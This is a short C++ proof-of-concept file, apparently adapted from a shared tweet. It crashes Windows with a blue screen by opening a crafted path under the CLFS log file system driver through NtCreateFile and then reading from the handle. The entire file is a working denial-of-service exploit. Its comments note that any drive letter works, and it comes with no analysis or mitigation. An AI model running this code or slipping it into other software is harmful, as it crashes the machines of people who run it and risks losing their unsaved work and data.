// cc: https://twitter.com/KLINIX5/status/1393168401837793281 
// Something I removed u don't have to add another path after the drive so any drive on ur system will work c: or e: etc ... 

#include <iostream>
#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS (*_NtCreateFile)(
	PHANDLE            FileHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK   IoStatusBlock,
	PLARGE_INTEGER     AllocationSize,
	ULONG              FileAttributes,
	ULONG              ShareAccess,
	ULONG              CreateDisposition,
	ULONG              CreateOptions,
	PVOID              EaBuffer,
	ULONG              EaLength
);

void bsod()
{

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");

	_NtCreateFile NtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");

	_OBJECT_ATTRIBUTES Obj{};
	UNICODE_STRING filePath{};
	HANDLE hFile;
	RtlInitUnicodeString(&filePath, L"\\CLFS\\??\\c:\\");
	InitializeObjectAttributes(&Obj, &filePath, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

	IO_STATUS_BLOCK IoStatusBlock{};

	NtCreateFile
	(
		&hFile, GENERIC_READ | SYNCHRONIZE, &Obj,
		&IoStatusBlock, 0, 
		FILE_ATTRIBUTE_NORMAL, 
		FILE_SHARE_READ, 
		FILE_OPEN_IF, 
		FILE_SYNCHRONOUS_IO_NONALERT, 
		nullptr, 0
	);

	char buf[2024];

	ReadFile(hFile, &buf, sizeof(buf), nullptr, nullptr);
}

int main()
{
	bsod();
	return 0;
}
